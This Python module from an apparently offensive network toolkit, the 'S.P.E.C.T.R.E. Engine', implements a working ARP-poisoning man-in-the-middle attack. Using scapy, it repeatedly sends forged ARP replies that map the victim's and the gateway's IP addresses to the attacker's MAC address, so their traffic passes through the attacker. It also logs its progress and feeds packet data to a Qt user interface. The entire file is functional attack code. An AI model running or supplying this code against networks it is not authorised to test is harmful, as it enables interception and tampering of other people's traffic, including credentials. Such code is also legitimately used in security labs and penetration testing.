# S.P.E.C.T.R.E. Engine - Licensed under AGPL-3.0
# Copyright (c) 2026 M. Sami Furqan. All rights reserved.
# See LICENSE file for full terms.

"""
core/mitm/arp.py — ARP poisoning implementation.
"""

from __future__ import annotations

import time
from typing import TYPE_CHECKING

from core.mitm._scapy import SCAPY_AVAILABLE, ARP, Ether, sendp, conf

if TYPE_CHECKING:
    from PySide6.QtCore import Signal


def run_arp_mitm(
    target_ip: str,
    gateway_ip: str,
    attacker_mac: str,
    interval: float,
    running_flag: list[bool],
    log_signal: Signal,  # type: ignore[type-arg]
    packet_generated: Signal,  # type: ignore[type-arg]
) -> None:
    """Continuously poison ARP tables on target and gateway.

    Args:
        target_ip: IP of the victim host.
        gateway_ip: IP of the default gateway.
        attacker_mac: MAC address of the attacker's interface.
        interval: Sleep interval in seconds between ARP bursts.
        running_flag: Single-element list; set ``[False]`` to stop the loop.
        log_signal: Qt Signal(str, str) for log messages.
        packet_generated: Qt Signal(dict) for UI packet visualization.
    """
    log_signal.emit(
        f"Starting ARP MITM: Poisoning {target_ip} and {gateway_ip}", "WARN"
    )
    while running_flag[0]:
        try:
            pkt1 = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                op=2, psrc=gateway_ip, hwsrc=attacker_mac, pdst=target_ip
            )
            sendp(pkt1, verbose=0)
            pkt2 = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                op=2, psrc=target_ip, hwsrc=attacker_mac, pdst=gateway_ip
            )
            sendp(pkt2, verbose=0)
            packet_generated.emit(
                {
                    "prefix": "L2",
                    "subtype": 6,
                    "rssi": -20,
                    "payload_size": 42,
                    "bssid": "FF:FF:FF:FF:FF:FF",
                    "channel": 0,
                }
            )
            time.sleep(interval)
        except Exception as e:
            log_signal.emit(f"ARP MITM Error: {e}", "CRIT")
            break
